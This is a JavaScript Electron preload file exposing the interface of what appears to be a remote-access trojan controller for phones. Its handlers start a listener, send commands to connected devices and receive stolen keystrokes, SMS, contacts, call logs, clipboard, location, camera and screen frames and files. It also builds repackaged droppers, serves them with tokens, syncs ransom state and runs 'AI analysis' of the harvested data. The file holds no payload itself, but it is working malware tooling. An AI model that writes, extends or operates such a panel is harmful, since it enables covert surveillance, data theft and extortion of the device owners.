const { contextBridge, ipcRenderer } = require('electron');

contextBridge.exposeInMainWorld('api', {
    // WELCOME
    welcomeStart: () => ipcRenderer.invoke('welcome-start'),
    welcomeLearn: () => ipcRenderer.invoke('welcome-learn'),
    welcomeReset: () => ipcRenderer.invoke('welcome-reset'),
    appQuit: () => ipcRenderer.invoke('app-quit'),

    // CONFIG
    configGet: () => ipcRenderer.invoke('config-get'),
    configSave: (cfg) => ipcRenderer.invoke('config-save', cfg),

    // CORE
    startListener: (p) => ipcRenderer.invoke('start-listener', p),
    stopListener: () => ipcRenderer.invoke('stop-listener'),
    getPCIP: () => ipcRenderer.invoke('get-pc-ip'),
    getDevices: () => ipcRenderer.invoke('get-devices'),
    sendCommand: (id, cmd, p) => ipcRenderer.invoke('send-command', id, cmd, p),
    getData: (c, id) => ipcRenderer.invoke('get-data', c, id),
    getUserData: () => ipcRenderer.invoke('get-user-data'),
    exportData: () => ipcRenderer.invoke('export-data'),
    clearData: () => ipcRenderer.invoke('clear-data'),

    // AI ANALYSIS
    aiAnalyze: (deviceId, scope) => ipcRenderer.invoke('ai-analyze', deviceId, scope),
    aiAnalyzeCancel: () => ipcRenderer.invoke('ai-analyze-cancel'),
    aiAnalyzeSave: (filename, content) => ipcRenderer.invoke('ai-analyze-save', filename, content),
    onAiAnalysisChunk: (c) => ipcRenderer.on('ai-analysis-chunk', (e, d) => c(d)),
    onAiAnalysisDone: (c) => ipcRenderer.on('ai-analysis-done', (e, d) => c(d)),
    onAiAnalysisError: (c) => ipcRenderer.on('ai-analysis-error', (e, d) => c(d)),

    // REPACK / DROPPER
    repackBuild: (options) => ipcRenderer.invoke('repack-build', options),
    dropperServerStart: () => ipcRenderer.invoke('dropper-server-start'),
    dropperServerStop: () => ipcRenderer.invoke('dropper-server-stop'),
    dropperServerStatus: () => ipcRenderer.invoke('dropper-server-status'),
    dropperGetToken: () => ipcRenderer.invoke('dropper-get-token'),
    dropperRegenerateToken: () => ipcRenderer.invoke('dropper-regenerate-token'),
    dropperSetToken: (t) => ipcRenderer.invoke('dropper-set-token', t),

    // SYSTEM / EXTERNAL
    systemInfo: () => ipcRenderer.invoke('system-info'),
    openExternal: (url) => ipcRenderer.invoke('open-external', url),

    // EVENTS
    onBuildLog: (c) => ipcRenderer.on('build-log', (e, d) => c(d)),
    onServerLog: (c) => ipcRenderer.on('server-log', (e, l) => c(l)),
    onDeviceLog: (c) => ipcRenderer.on('device-log', (e, id, l, m) => c(id, l, m)),
    onDeviceConnected: (c) => ipcRenderer.on('device-connected', (e, d) => c(d)),
    onDeviceDisconnected: (c) => ipcRenderer.on('device-disconnected', (e, d) => c(d)),
    onCommandResult: (c) => ipcRenderer.on('command-result', (e, id, cmd, res) => c(id, cmd, res)),
    onKeylog: (c) => ipcRenderer.on('keylog', (e, id, d) => c(id, d)),
    onSMS: (c) => ipcRenderer.on('sms', (e, id, d) => c(id, d)),
    onContacts: (c) => ipcRenderer.on('contacts', (e, id, d) => c(id, d)),
    onClipboard: (c) => ipcRenderer.on('clipboard', (e, id, d) => c(id, d)),
    onCalls: (c) => ipcRenderer.on('calls', (e, id, d) => c(id, d)),
    onApps: (c) => ipcRenderer.on('apps', (e, id, d) => c(id, d)),
    onUiTree: (c) => ipcRenderer.on('ui-tree', (e, id, d) => c(id, d)),
    onStreamConnected: (c) => ipcRenderer.on('stream-connected', (e, id, w, h) => c(id, w, h)),
    onStreamDisconnected: (c) => ipcRenderer.on('stream-disconnected', (e, id) => c(id)),
    onStreamFrame: (c) => ipcRenderer.on('stream-frame', (e, id, b64) => c(id, b64)),
    onScreenFrame: (c) => ipcRenderer.on('screen-frame', (e, id, b64) => c(id, b64)),
    onLocation: (c) => ipcRenderer.on('location', (e, id, d) => c(id, d)),
    onCamera: (c) => ipcRenderer.on('camera', (e, id, b64) => c(id, b64)),
    onFiles: (c) => ipcRenderer.on('files', (e, id, d) => c(id, d)),
    onFileData: (c) => ipcRenderer.on('file-data', (e, id, n, b64) => c(id, n, b64)),
    onUserData: (c) => ipcRenderer.on('user-data', (e, id, d) => c(id, d)),
    onRansomSync: (c) => ipcRenderer.on('ransom-sync', (e, id, d) => c(id, d)),
    onDropperLog: (c) => ipcRenderer.on('dropper-log', (e, l) => c(l)),
    onDropperStatus: (c) => ipcRenderer.on('dropper-status', (e, r) => c(r))
});